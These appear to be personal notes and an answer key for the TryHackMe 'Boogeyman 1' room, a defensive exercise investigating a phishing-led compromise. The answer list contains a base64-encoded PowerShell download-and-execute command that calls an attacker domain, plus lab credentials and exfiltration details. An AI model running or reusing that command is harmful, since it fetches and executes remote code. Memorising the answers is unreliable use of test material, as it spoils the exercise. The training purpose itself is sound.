#Subscribers #Windows 
https://tryhackme.com/room/boogeyman1

## intro 

﻿_Uncover the secrets of the new emerging threat, the Boogeyman._

In this room, you will be tasked to analyze the Tactics, Techniques, and Procedures (TTPs) executed by a threat group, from obtaining initial access until achieving its objective.

Prerequisites

This room may require the combined knowledge gained from the SOC L1 Pathway. We recommend going through the following rooms before attempting this challenge.

- [Phishing Analysis Fundamentals](https://tryhackme.com/room/phishingemails1tryoe)
- [Phishing Analysis Tools](https://tryhackme.com/room/phishingemails3tryoe)
- [Windows Event Logs](https://tryhackme.com/room/windowseventlogs)
- [Wireshark: Traffic Analysis](https://tryhackme.com/room/wiresharktrafficanalysis)
- [Tshark: The Basics](https://tryhackme.com/r/room/tsharkthebasics)

Investigation Platform

Before we proceed, deploy the attached machine by clicking the **Start Machine button** in the upper-right-hand corner of the task. It may take up to 3-5 minutes to initialise the services.

The machine will start in a split-screen view. In case the VM is not visible, use the blue Show Split View button at the top-right of the page.  

Artefacts  

For the investigation proper, you will be provided with the following artefacts:

- Copy of the phishing email (dump.eml)
- Powershell Logs from Julianne's workstation (powershell.json)
- Packet capture from the same workstation (capture.pcapng)

Note: The powershell.json file contains JSON-formatted PowerShell logs extracted from its original evtx file via the [evtx2json](https://github.com/Silv3rHorn/evtx2json) tool.

You may find these files in the /home/ubuntu/Desktop/artefacts directory.  

Tools

﻿The provided VM contains the following tools at your disposal:

- Thunderbird: a free and open-source cross-platform email client.
- [LNKParse3](https://github.com/Matmaus/LnkParse3): a python package for forensics of a binary file with LNK extension.
- Wireshark: GUI-based packet analyser.
- Tshark: CLI-based Wireshark. 
- jq: a lightweight and flexible command-line JSON processor.

To effectively parse and analyse the provided artefacts, you may also utilise built-in command-line tools such as:

- grep
- sed
- awk
- base64

Now, let's start hunting the Boogeyman!

## email analysis

The Boogeyman is here!  

Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.

## answers

```
agriffin@bpakcaging.xyz

julianne.westcott@hotmail.com

elasticemail

Invoice_20230103.lnk

Invoice2023!

aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==

cdn.bpakcaging.xyz,files.bpakcaging.xyz

seatbelt

C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

Microsoft Sticky Notes

protected_data.kdbx

keepass

hex

nslookup

python 

POST 

dns 

%p9^3!lL^Mz47E2GaT^y

4024007128269551

```

https://github.com/HuskyChaos/writeup-Boogeyman_1

https://motasem-notes.net/blue-team-soc-real-world-case-studies-complete-walkthrough-tryhackme-boogeyman-123/

![[Pasted image 20250315102735.png]]

152 points

